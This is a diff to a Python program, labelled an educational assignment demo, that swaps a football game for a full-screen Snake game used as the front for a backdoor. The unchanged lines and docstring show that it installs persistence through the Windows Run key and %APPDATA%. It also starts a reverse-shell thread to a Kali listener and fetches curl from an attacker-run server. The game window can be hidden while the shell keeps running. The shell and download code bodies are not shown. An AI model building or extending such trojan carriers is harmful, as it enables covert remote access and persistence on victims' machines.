@@ -1,13 +1,13 @@
-"""
+""""
 **EDUCATIONAL DEMO ONLY – Rwanda Coding Academy Assignment**
 Use exclusively in isolated VMs. Never deploy on real systems.
 This code demonstrates backdoor techniques for defense learning purposes.
 
-Interactive 2‑player mini football game with an educational backdoor demo. On consent:
+Interactive Snake game with an educational backdoor demo. On consent:
 - Checks/installs curl dependency from Kali HTTP server
 - Establishes reverse shell to Kali listener (background thread)
 - Adds persistence via %APPDATA% and Run key
-- Runs a full‑screen football game. All in isolated VMs only.
+- Runs a full‑screen Snake game. All in isolated VMs only.
 """
 
 import os
@@ -17,6 +17,7 @@ import subprocess
 import threading
 import shutil
 import urllib.request
+import random
 
 # Windows-only for persistence
 if sys.platform == "win32":
@@ -60,7 +61,7 @@ def show_consent():
         "• Check/install dependencies (e.g. curl from instructor's VM)\n"
         "• Open a reverse shell to the instructor's Kali listener\n"
         "• Add itself to startup (persistence)\n"
-        "• Run a full-screen 2-player mini football game\n\n"
+        "• Run a full-screen Snake game\n\n"
         "All inside isolated VMs only. Do you consent?"
     )
     result = messagebox.askyesno("Educational Demo – Consent", msg, icon="question")
@@ -183,21 +184,26 @@ def install_persistence():
     except Exception as e:
         # Optional: log the error (for debugging in the lab)
         print(f"[!] Persistence installation failed: {e}")
- # ---------- Mini football game GUI ----------
-class FootballGameApp:
-    """Simple two‑player football game.
 
-    - Player 1 (left):  WASD keys
-    - Player 2 (right): Arrow keys
-    - First to reach a chosen score wins.
+
+# ---------- Snake game GUI ----------
+class SnakeGameApp:
+    """Simple Snake game.
+
+    - Control the snake with arrow keys
+    - Eat food to grow and increase score
+    - Game ends if snake hits wall or itself
+    - Press R to restart, Esc to hide
     """
 
-    FIELD_COLOR = "#106c4a"
-    LINE_COLOR = "#ffffff"
+    FIELD_COLOR = "#000000"
+    SNAKE_COLOR = "#00ff00"
+    FOOD_COLOR = "#ff0000"
+    TEXT_COLOR = "#ffffff"
 
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("Mini Football – Educational Demo")
+        self.root.title("Snake Game – Educational Demo")
         self.root.configure(bg=self.FIELD_COLOR)
         # Full-screen, always on top (no visible close button in typical fullscreen)
         self.root.attributes("-fullscreen", True)
@@ -209,6 +215,15 @@ class FootballGameApp:
         self.width = self.root.winfo_screenwidth()
         self.height = self.root.winfo_screenheight()
 
+        # Game grid settings
+        self.cell_size = 30
+        self.grid_width = self.width // self.cell_size
+        self.grid_height = self.height // self.cell_size
+        
+        # Center the game area
+        self.offset_x = (self.width - (self.grid_width * self.cell_size)) // 2
+        self.offset_y = (self.height - (self.grid_height * self.cell_size)) // 2
+
         self.canvas = tk.Canvas(
             self.root,
             width=self.width,
@@ -218,221 +233,176 @@ class FootballGameApp:
         )
         self.canvas.pack(fill="both", expand=True)
 
-        # Game objects
-        self.player_size = 60
-        self.ball_radius = 18
-        self.player_speed = 12
-        self.ball_dx = 10
-        self.ball_dy = 6
-        self.max_score = 5
-        self.score_left = 0
-        self.score_right = 0
+        # Game state
+        self.reset_game()
+        
+        # Bind keys
+        self.root.bind("<KeyPress>", self.on_key_press)
+        
+        # Start game loop
+        self.game_running = True
+        self.game_loop()
 
-        self._create_field()
-        self._create_players_and_ball()
-        self._bind_keys()
-        self._game_loop()
+    def reset_game(self):
+        """Reset the game to initial state."""
+        self.snake = [(self.grid_width // 2, self.grid_height // 2)]
+        self.direction = (1, 0)  # Right
+        self.next_direction = (1, 0)
+        self.food = self.generate_food()
+        self.score = 0
+        self.game_over = False
+        self.game_over_text = None
+        self.draw_game()
+
+    def generate_food(self):
+        """Generate food at random position not occupied by snake."""
+        while True:
+            food = (random.randint(0, self.grid_width - 1), 
+                   random.randint(0, self.grid_height - 1))
+            if food not in self.snake:
+                return food
 
     def hide_window(self):
         """Hide the game window but keep Tk mainloop and backdoor thread alive."""
         self.root.withdraw()
 
-    # ----- field and objects -----
-    def _create_field(self):
-        w, h = self.width, self.height
-        # Center line
-        self.canvas.create_line(w // 2, 0, w // 2, h, fill=self.LINE_COLOR, width=4)
-        # Center circle
-        r = 120
-        self.canvas.create_oval(
-            w // 2 - r,
-            h // 2 - r,
-            w // 2 + r,
-            h // 2 + r,
-            outline=self.LINE_COLOR,
-            width=3,
-        )
-        # Goals (just visual rectangles)
-        goal_width = 40
-        self.left_goal = self.canvas.create_rectangle(
-            0,
-            h * 0.3,
-            goal_width,
-            h * 0.7,
-            outline=self.LINE_COLOR,
-            width=3,
-        )
-        self.right_goal = self.canvas.create_rectangle(
-            w - goal_width,
-            h * 0.3,
-            w,
-            h * 0.7,
-            outline=self.LINE_COLOR,
-            width=3,
-        )
-        # Score text
-        self.score_text = self.canvas.create_text(
-            w // 2,
-            50,
-            text="0 : 0",
-            fill="#ffffff",
-            font=("Segoe UI", 32, "bold"),
-        )
-
-    def _create_players_and_ball(self):
-        w, h = self.width, self.height
-        ps = self.player_size
-        # Left player
-        self.p1 = self.canvas.create_rectangle(
-            80,
-            h // 2 - ps // 2,
-            80 + ps,
-            h // 2 + ps // 2,
-            fill="#1e90ff",
-            outline="white",
-            width=2,
-        )
-        # Right player
-        self.p2 = self.canvas.create_rectangle(
-            w - 80 - ps,
-            h // 2 - ps // 2,
-            w - 80,
-            h // 2 + ps // 2,
-            fill="#ff6347",
-            outline="white",
-            width=2,
-        )
-        # Ball
-        self.ball = self._reset_ball(center_only=False)
-
-    def _reset_ball(self, center_only=True):
-        w, h = self.width, self.height
-        r = self.ball_radius
-        if not center_only:
-            return self.canvas.create_oval(
-                w // 2 - r,
-                h // 2 - r,
-                w // 2 + r,
-                h // 2 + r,
-                fill="#f5f5f5",
-                outline="#333333",
-                width=2,
-            )
-        # Move existing ball back to center
-        bx1, by1, bx2, by2 = self.canvas.coords(self.ball)
-        cx = (bx1 + bx2) / 2
-        cy = (by1 + by2) / 2
-        dx = w // 2 - cx
-        dy = h // 2 - cy
-        self.canvas.move(self.ball, dx, dy)
-        # Change direction slightly after each goal
-        self.ball_dx = -self.ball_dx
-        self.ball_dy = 0
-        return self.ball
-
-    # ----- controls -----
-    def _bind_keys(self):
-        self.keys_pressed = set()
-        self.root.bind("<KeyPress>", self._on_key_press)
-        self.root.bind("<KeyRelease>", self._on_key_release)
-
-    def _on_key_press(self, event):
-        self.keys_pressed.add(event.keysym)
-
-    def _on_key_release(self, event):
-        self.keys_pressed.discard(event.keysym)
-
-    # ----- game loop -----
-    def _game_loop(self):
-        self._update_players()
-        self._update_ball()
-        self.root.after(30, self._game_loop)
-
-    def _update_players(self):
-        s = self.player_speed
-        # Player 1 – WASD
-        dx1 = dy1 = 0
-        if "w" in self.keys_pressed or "W" in self.keys_pressed:
-            dy1 -= s
-        if "s" in self.keys_pressed or "S" in self.keys_pressed:
-            dy1 += s
-        if "a" in self.keys_pressed or "A" in self.keys_pressed:
-            dx1 -= s
-        if "d" in self.keys_pressed or "D" in self.keys_pressed:
-            dx1 += s
-        self._move_clamped(self.p1, dx1, dy1)
-
-        # Player 2 – arrows
-        dx2 = dy2 = 0
-        if "Up" in self.keys_pressed:
-            dy2 -= s
-        if "Down" in self.keys_pressed:
-            dy2 += s
-        if "Left" in self.keys_pressed:
-            dx2 -= s
-        if "Right" in self.keys_pressed:
-            dx2 += s
-        self._move_clamped(self.p2, dx2, dy2)
-
-    def _move_clamped(self, item, dx, dy):
-        if dx == 0 and dy == 0:
+    def on_key_press(self, event):
+        """Handle key presses."""
+        if event.keysym == "r" or event.keysym == "R":
+            self.reset_game()
             return
-        x1, y1, x2, y2 = self.canvas.coords(item)
-        nx1, ny1, nx2, ny2 = x1 + dx, y1 + dy, x2 + dx, y2 + dy
-        # stay inside field
-        if nx1 < 0 or nx2 > self.width:
-            dx = 0
-        if ny1 < 0 or ny2 > self.height:
-            dy = 0
-        self.canvas.move(item, dx, dy)
+            
+        if self.game_over:
+            return
+            
+        # Change direction (prevent reversing)
+        if event.keysym == "Up" and self.direction != (0, 1):
+            self.next_direction = (0, -1)
+        elif event.keysym == "Down" and self.direction != (0, -1):
+            self.next_direction = (0, 1)
+        elif event.keysym == "Left" and self.direction != (1, 0):
+            self.next_direction = (-1, 0)
+        elif event.keysym == "Right" and self.direction != (-1, 0):
+            self.next_direction = (1, 0)
 
-    def _update_ball(self):
-        # Move ball
-        self.canvas.move(self.ball, self.ball_dx, self.ball_dy)
-        bx1, by1, bx2, by2 = self.canvas.coords(self.ball)
-
-        # Bounce on top/bottom
-        if by1 <= 0 or by2 >= self.height:
-            self.ball_dy = -self.ball_dy
-
-        # Collisions with players (simple AABB check)
-        for player in (self.p1, self.p2):
-            px1, py1, px2, py2 = self.canvas.coords(player)
-            if not (bx2 < px1 or bx1 > px2 or by2 < py1 or by1 > py2):
-                # reflect horizontally, add a bit of vertical variation
-                self.ball_dx = -self.ball_dx
-                self.ball_dy += (by1 + by2) / 2 - (py1 + py2) / 2
-                # small clamp on dy
-                if self.ball_dy > 12:
-                    self.ball_dy = 12
-                if self.ball_dy < -12:
-                    self.ball_dy = -12
-                break
-
-        # Check for goals
-        if bx2 <= 0:
-            # Right player scores
-            self.score_right += 1
-            self._after_goal()
-        elif bx1 >= self.width:
-            # Left player scores
-            self.score_left += 1
-            self._after_goal()
-
-    def _after_goal(self):
-        self.canvas.itemconfigure(
-            self.score_text,
-            text=f"{self.score_left} : {self.score_right}",
-        )
-        self._reset_ball(center_only=True)
-        # Optional: show a short message
-        if self.score_left >= self.max_score or self.score_right >= self.max_score:
-            winner = "Left (Blue)" if self.score_left > self.score_right else "Right (Red)"
-            msg = f"{winner} player wins! Press Esc to hide the game."
-            self.canvas.itemconfigure(
-                self.score_text,
-                text=f"{self.score_left} : {self.score_right}  –  {msg}",
+    def draw_game(self):
+        """Draw the current game state."""
+        self.canvas.delete("all")
+        
+        # Draw grid (optional, for visual reference)
+        for i in range(self.grid_width + 1):
+            x = self.offset_x + i * self.cell_size
+            self.canvas.create_line(x, self.offset_y, x, self.offset_y + self.grid_height * self.cell_size,
+                                   fill="#333333", width=1)
+        for i in range(self.grid_height + 1):
+            y = self.offset_y + i * self.cell_size
+            self.canvas.create_line(self.offset_x, y, self.offset_x + self.grid_width * self.cell_size, y,
+                                   fill="#333333", width=1)
+        
+        # Draw snake
+        for i, segment in enumerate(self.snake):
+            x, y = segment
+            color = self.SNAKE_COLOR if i == 0 else "#00aa00"  # Head brighter
+            self.canvas.create_rectangle(
+                self.offset_x + x * self.cell_size + 2,
+                self.offset_y + y * self.cell_size + 2,
+                self.offset_x + (x + 1) * self.cell_size - 2,
+                self.offset_y + (y + 1) * self.cell_size - 2,
+                fill=color,
+                outline=""
             )
+        
+        # Draw food
+        if self.food:
+            fx, fy = self.food
+            self.canvas.create_oval(
+                self.offset_x + fx * self.cell_size + 4,
+                self.offset_y + fy * self.cell_size + 4,
+                self.offset_x + (fx + 1) * self.cell_size - 4,
+                self.offset_y + (fy + 1) * self.cell_size - 4,
+                fill=self.FOOD_COLOR,
+                outline=""
+            )
+        
+        # Draw score
+        self.canvas.create_text(
+            self.width // 2,
+            30,
+            text=f"Score: {self.score}",
+            fill=self.TEXT_COLOR,
+            font=("Segoe UI", 24, "bold")
+        )
+        
+        # Draw game over message
+        if self.game_over:
+            if self.game_over_text:
+                self.canvas.delete(self.game_over_text)
+            self.game_over_text = self.canvas.create_text(
+                self.width // 2,
+                self.height // 2,
+                text=f"GAME OVER!\nFinal Score: {self.score}\nPress R to restart\nPress ESC to hide",
+                fill=self.TEXT_COLOR,
+                font=("Segoe UI", 36, "bold"),
+                justify="center"
+            )
+        
+        # Draw controls hint
+        self.canvas.create_text(
+            self.width // 2,
+            self.height - 30,
+            text="Arrow Keys: Move | R: Restart | ESC: Hide",
+            fill=self.TEXT_COLOR,
+            font=("Segoe UI", 12)
+        )
+
+    def update_game(self):
+        """Update game state."""
+        if self.game_over or not self.game_running:
+            return
+            
+        # Update direction
+        self.direction = self.next_direction
+        
+        # Calculate new head position
+        head_x, head_y = self.snake[0]
+        dx, dy = self.direction
+        new_head = (head_x + dx, head_y + dy)
+        
+        # Check for collisions
+        # Wall collision
+        if (new_head[0] < 0 or new_head[0] >= self.grid_width or
+            new_head[1] < 0 or new_head[1] >= self.grid_height):
+            self.game_over = True
+            self.draw_game()
+            return
+        
+        # Self collision (excluding tail if we're about to move)
+        if new_head in self.snake[:-1]:
+            self.game_over = True
+            self.draw_game()
+            return
+        
+        # Add new head
+        self.snake.insert(0, new_head)
+        
+        # Check if food eaten
+        if new_head == self.food:
+            self.score += 1
+            self.food = self.generate_food()
+            # Don't remove tail (snake grows)
+        else:
+            # Remove tail
+            self.snake.pop()
+        
+        # Draw updated game
+        self.draw_game()
+
+    def game_loop(self):
+        """Main game loop."""
+        if self.game_running:
+            self.update_game()
+            # Move every 150ms
+            self.root.after(150, self.game_loop)
 
     def run(self):
         self.root.mainloop()
@@ -462,7 +432,7 @@ def main():
         install_persistence()
     t = threading.Thread(target=reverse_shell, daemon=True)
     t.start()
-    app = FootballGameApp()
+    app = SnakeGameApp()
     app.run()
 
 
